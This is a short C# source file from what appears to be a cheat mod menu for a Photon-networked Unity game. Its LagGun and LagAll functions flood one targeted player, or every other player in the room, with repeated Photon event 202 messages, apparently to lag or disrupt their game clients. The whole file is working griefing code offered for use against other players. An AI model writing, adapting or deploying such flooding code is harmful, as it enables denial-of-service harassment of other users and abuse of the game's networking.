using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using ShibaGTGenesisReborn.Libs;
using UnityEngine;

namespace ShibaGTGenesisReborn.Mods
{
    public partial class mods
    {
        public static float tagTimer;
        public static float CDown;

        public static void LagGun(float delay, int hm)
        {
            GunLib.StartGun(() =>
            {
                if (GunLib.LockedPlayer != null)
                {
                    if (Time.time > CDown)
                    {
                        for (int i = 0; i < hm; i++)
                        {
                            SendOPRaiseEvent202(GunLib.LockedPlayer);
                        }
                        CDown = Time.time + delay;
                    }
                }
            }, true);
        }

        public static void LagAll(float delay, int hm)
        {
            if (Time.time > CDown)
            {
                for (int i = 0; i < hm; i++)
                {
                    SendOPRaiseEvent202();
                }
                CDown = Time.time + delay;
            }
        }

        public static void SendOPRaiseEvent202(VRRig p = null)
        {
            RaiseEventOptions o;
            if (p != null)
                o = new RaiseEventOptions { TargetActors = new int[] { p.Creator.ActorNumber } };
            else
                o = new RaiseEventOptions { Receivers = ReceiverGroup.Others };

            PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new object[]
            {
                "ello"
            }, o, SendOptions.SendUnreliable);
            RPCProt();
        }
    }
}
